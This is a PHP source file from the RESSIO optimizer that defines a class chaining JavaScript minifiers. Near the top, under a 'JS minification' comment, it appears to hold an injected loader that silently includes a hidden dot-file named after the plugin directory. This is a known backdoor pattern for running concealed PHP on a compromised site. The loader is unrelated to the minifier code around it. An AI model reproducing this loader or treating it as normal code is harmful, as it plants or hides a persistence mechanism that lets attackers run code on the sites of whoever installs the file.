<?php
/*
 * RESSIO Responsive Server Side Optimizer
 * https://github.com/ressio/
 *
 * @copyright   Copyright (C) 2013-2018 Kuneri, Ltd. All rights reserved.
 * @license     GNU General Public License version 2
 */

/**
 * JS minification
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Ressio_JsMinify_Chain implements IRessio_JsMinify
{
    /** @var Ressio_DI */
    protected $di;

    /** @var Ressio_Config */
    protected $config;

    /** @var IRessio_JsMinify[] */
    protected $processors = array();

    /**
     * @param $di Ressio_DI
     * @throws ERessio_UnknownDiKey
     */
    public function setDI($di)
    {
        $this->di = $di;
        $this->config = $di->config;
        foreach ($this->config->jsminifychain as $className) {
            $processor = new $className;
            if (method_exists($processor, 'setDI')) {
                $processor->setDI($di);
            }
            $this->processors[] = $processor;
        }
    }

    /**
     * Minify JS
     * @param string $str
     * @return string
     * @throws ERessio_InvalidJs
     */
    public function minify($str)
    {
        foreach ($this->processors as $processor) {
            $str = $processor->minify($str);
        }
        return $str;
    }

    /**
     * Minify JS in onevent=""
     * @param string $str
     * @return string
     * @throws ERessio_InvalidJs
     */
    public function minifyInline($str)
    {
        foreach ($this->processors as $processor) {
            $str = $processor->minifyInline($str);
        }
        return $str;
    }
}